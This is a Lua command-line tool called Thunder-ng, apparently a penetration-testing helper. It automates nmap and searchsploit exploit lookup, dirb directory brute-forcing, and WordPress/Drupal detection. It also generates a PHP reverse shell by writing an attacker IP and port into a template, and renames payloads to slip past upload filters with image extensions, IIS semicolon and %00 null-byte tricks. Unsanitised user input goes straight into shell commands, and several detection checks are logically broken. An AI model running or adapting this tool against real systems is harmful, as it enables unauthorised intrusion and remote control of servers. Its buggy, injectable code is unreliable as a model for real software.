--[[

MIT License

Copyright (c) 2022 BugAlpha

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


]]

print("Welcome To Thunder-ng")
-- Show the help menu if arg[2] is -h
local http_request = require "http.request" -- The http lib
function help()
	if ( arg[1] == "-h" )
	then
		print("Help Menu:")
		print("-h   	| shows this help and exit")
		print("-exp 	| Search For available exploits based on version numbers scans")
		print("--hidden | Search for hidden content usage [ lua main.lua --hidden <CMS name> ] or  [ lua main.lua --hidden raw]")
		print("-rv      | Reverse Shell usage[ lua main.lua -rv --bypass to bypass file upload filter ] or [ -rv --generator to generate a php reverse shell]")
		print("-cms     | Cms stuff usage [ lua main.lua -cms --detect to detect cms used in the target ]")
	elseif ( arg[1] == nil or arg[1] == '' )
	then
		print("Help Menu:")
		print("-h   	| shows this help and exit")
		print("-exp 	| Search For available exploits based on version numbers scans")
		print("--hidden | Search for hidden content usage [ lua main.lua --hidden <CMS name> ] or  [ lua main.lua --hidden raw]")
		print("-rv      | Reverse Shell usage[ lua main.lua -rv --bypass to bypass file upload filter ] or [ -rv --generator to generate a php reverse shell]")
		print("-cms     | Cms stuff usage [ lua main.lua -cms --detect to detect cms used in the target ]")

	end
end
-- Search for exploits available
function exploits_searcher ()
	if ( arg[1] == "-exp" )
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		local nmap_scan = os.execute("nmap -Pn -sV " .. ip .. " -oX results/nmap_" .. os.date("%m.%d.%Y") .. ".xml" )
		local sp_scan = os.execute("searchsploit -x --nmap results/nmap_" .. os.date("%m.%d.%Y") .. ".xml" )
	end
end
function hidden_content_hunt()
	if ( arg[1] == "--hidden" and arg[2] == "django" )
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		local wordlist = "wordlists/Django.txt"
		local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/django_" .. os.date("%m.%d.%Y") .. ".txt && cat results/django_" .. os.date("%m.%d.%Y") .. ".txt")
		print("[*] Saved to results/django_" .. os.date("%m.%d.%Y") .. ".txt")
	elseif ( arg[1] == "--hidden" and arg[2] == "raw")
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		io.write("Do you have a wordlist? give me the path or hit y to use default : ")
		local i = io.read()
		if ( i == "y" or i == "Y" )
		then
			local wordlist = "wordlists/common.txt"
			local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt && cat results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
			print("[*] Saved to results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
		else
			local wordlist = i
			local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt && cat results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
			print("[*] Saved to results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
		end

	elseif ( arg[1] == "--hidden" and arg[2] == "drupal")
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		local wordlist = "wordlists/Drupal.txt"
		local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/drupal_" .. os.date("%m.%d.%Y") .. ".txt && cat results/drupal_" .. os.date("%m.%d.%Y") .. ".txt")
		print("[*] Saved to results/drupal_" .. os.date("%m.%d.%Y") .. ".txt")
	elseif ( arg[1] == "--hidden" and arg[2] == "umbraco")
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		local wordlist = "wordlists/Umbraco.txt"
		local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/umbraco_" .. os.date("%m.%d.%Y") .. ".txt && cat results/umbraco_" .. os.date("%m.%d.%Y") .. ".txt")
		print("[*] Saved to results/umbraco_" .. os.date("%m.%d.%Y") .. ".txt")
	end
end
function reverse_shell()
if ( arg[1] == "-rv" and arg[2] == "--bypass" )
	then
			print("Select what you want to byass file upload on")
			print("1-PHP")
			io.write("->: ")
			local i = io.read()
			if ( i == "1" )
				then
					print("Please The path to you reverse shell")
					io.write("->: ")
					local reverse_shell_path = io.read()
					print("Select which Method you want to use : ")
					print("1-Change File extension To an image")
					print("2-IIS 6 semi-colon bypass")
					print("3-null character injection")
					print("4-Change Exif data (Soon)")
					io.write("->: ")
					local i = io.read()
				end
				if ( i == "1" )
					then
						os.execute("mv " .. reverse_shell_path .. " results/" .. reverse_shell_path .. ".jpg")
						print("[*] Payload was saved to results/" .. reverse_shell_path .. ".jpg")
					end
				if ( i == "2" )
					then
						os.execute("mv " .. reverse_shell_path .. " results/" .. "'" ..reverse_shell_path .. "'" .. "';.jpg'")
						print("[*] Payload was saved to results/" .. reverse_shell_path .. "';.jpg'")
					end
				if ( i == "3" )
					then
						os.execute("mv " .. reverse_shell_path .. " results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'" )
						print("[*] Payload was saved to results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'")
					end
				end
	end
if ( arg[1] == "-rv" and arg[2] == "--generator" )
	then
		print("Please give your ip address (If your attack is local give your  address else give your public ip)")
		io.write("->: ")
		ip   = io.read()
		print("Please provide a port number")
		io.write("->: ")
		port = io.read()
		print("What you name you want to give to the reverse shell (Make sure you add .php at the end)")
		io.write("->: ")
		path = io.read()
		os.execute("sed -i \'49s/.*/$ip = " .. "'" .. ip .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && " .. " sed -i \'50s/.*/$port = " .. "'" .. port .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && cat reverse_shells/php-reverse-shell.php > " .. path)
		print("[:)] Done!")
		print("[*] Saved to " .. path )
	end
function cms_detect()
	if ( arg[1] == "-cms" and arg[2] == "--detect" ) then
					print("Please give your target web address ex \"https://example.com\" ")
					io.write("->: ")
					ip = io.read()
					-- First try searching for Wordpress in source code
					local headers, stream = assert(http_request.new_from_uri(ip):go())
					if headers:get ":status" == "200" then
    				print("[*] Target is alive")
						print("[*] Getting source code ...")
						local body = assert(stream:get_body_as_string())
						temp = assert(io.open("temp", "w"))
						temp:write(body)
						temp:close()
						wp_grep = assert(io.popen("grep wordpress temp", "r"))
						wp_grepOutput = assert(wp_grep:read('*all'))
						if string.len(wp_grepOutput) > 0 then -- I konw it seems like a lot but i'm trying to make the code readble
								found_wp = true
							else
								print("[-] Can't find Wordpress in source code")
								found_wp = false
						end
						if found_wp == true then
							print("[*] Found Wordpress in the source code !")
						end
						-- get to next method if found_wp is false
						if found_wp == false then
							wp_content_grep = assert(io.popen("grep wp-content temp", "r"))
							wp_content_grepOutput = assert(wp_grep:read('*all'))
							if string.len(wp_content_grepOutput) > 0 then
									found_wp_content = true
								else
									print("[-] Can't find wp-content in source code")
									found_wp_content = false
							end
							if found_wp_content == true then
								print("[*] Found wp-content in the source code !")
							end
							if found_wp == false then
								local headers, stream = assert(http_request.new_from_uri(ip .. "/robots.txt"):go())
								print("[/\\] Requesting " .. ip .. "/robots.txt")
								if headers:get ":status" == "200" or headers:get ":status" == "403" then
									print("[*] There is a robots.txt lemme fetch it")
									robots_grep = assert(io.popen("grep wp-admin temp", "r"))
									robots_grepOutput = assert(robots_grep:read('*all'))
									if string.len(wp_grepOutput) > 0 then
											found_wp_admin = true
										else
											print("[-] Can't find wp-admin in robots.txt")
											found_wp_admin = false
									end
									if found_wp_admin == true then
										print("[*] Found wp-admin in the robots.txt !")
									end
									if found_wp_admin == false then -- Now if everything fails means that the target does not use wordpress lets switch to drupal search
										print("[-] Can't find any hints for wordpress i will search for drupal now")
										drupal_search_source = assert(io.popen("grep -e drupal -e Drupal temp"))
										drupal_search_sourceOutput = assert(drupal_search_source:read('*all'))
										if string.len(drupal_search_sourceOutput) > 0 then
												drupal_found = true
												print("[*] Found drupal in source code ! ")
											else
												drupal_found = false
												print('[-] Cant find drupal in the source code ')
										end
										if drupal_found == false then
											print("[/\\] Requesting " .. ip .."/admin")
											local headers, stream = assert(http_request.new_from_uri(ip .. "/admin"):go())
											if headers:get ":status" == "200" or headers:get ":status" == "403" or headers:get ":status" == "443" then
												admin_drupal_found = true
												print("[*] " .. ip .. " /admin is alive hints to drupal")
											else
												admin_drupal_found = false
												print("[-] The /admin portal is not alive")
											end
										end
										if admin_drupal_found == false then
											print("[/\\] Requesting " .. ip .."/user/register")
											local headers, stream = assert(http_request.new_from_uri(ip .. "/user/register"):go())
											if headers:get ":status" == "200" or headers:get ":status" == "403" or headers:get ":status" == "443" then
												user_register_found = true
												print("[*] " .. ip .. "/user/register is alive hints to a drupal site")
												else
													user_register_found = false
													print("[*] " .. ip .. "/user/register is not alive")
											end
											if  drupal_found == true or admin_drupal_found == true or user_register_found == true then
												print("[*] Ending The target seems to use Drupal")
												elseif found_wp == true or found_wp_admin == true or found_wp_content == true then
														print("[*] Ending The target seems to use Wordpress")
												end
										end
									end
								end
							end
						end
					end
	end
end
help()
exploits_searcher()
hidden_content_hunt()
reverse_shell()
cms_detect()
